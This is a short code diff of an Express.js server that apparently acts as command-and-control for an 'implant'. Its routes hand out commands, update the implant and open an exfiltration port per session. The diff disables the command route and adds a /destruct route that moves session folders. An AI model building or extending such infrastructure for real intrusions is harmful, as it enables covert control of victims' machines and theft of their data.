@@ -62,12 +62,12 @@ app.get('/info', (req, res) => {
 });
 
 //Used to send out command to the server to be read by the implant
-app.get('/retrcommand', (req, res) => {
-	var sid = req.query.sid;
-    res.send(command)
-	console.log(`${sid} has been sent ${command}.`);
-	ReturnToWait(sid)
-});
+//app.get('/retrcommand', (req, res) => {
+//	var sid = req.query.sid;
+//    res.send(command)
+//	console.log(`${sid} has been sent ${command}.`);
+//	ReturnToWait(sid)
+//});
 
 app.get('/updateImplant', (req, res) => {
 	var sid = req.query.sid;
@@ -92,6 +92,19 @@ app.get('/exfil', (req, res) => {
 	OpenExfilPort(sid)
 	res.send()
 	ReturnToWait(sid)
+});
+
+
+//Trying to move old Session folders to an different folder
+app.get('/destruct', (req, res) => {
+	var sid = req.query.sid;
+	var oldPath = `Sessions/${sid}`
+	var newPath = `Deleted_Sessions/${sid}`
+
+	fs.rename(oldPath, newPath, function (err) {
+  	if (err) throw err
+  	console.log('Successfully renamed - AKA moved!')
+	})
 });
 
 function ReturnToWait(sid) {
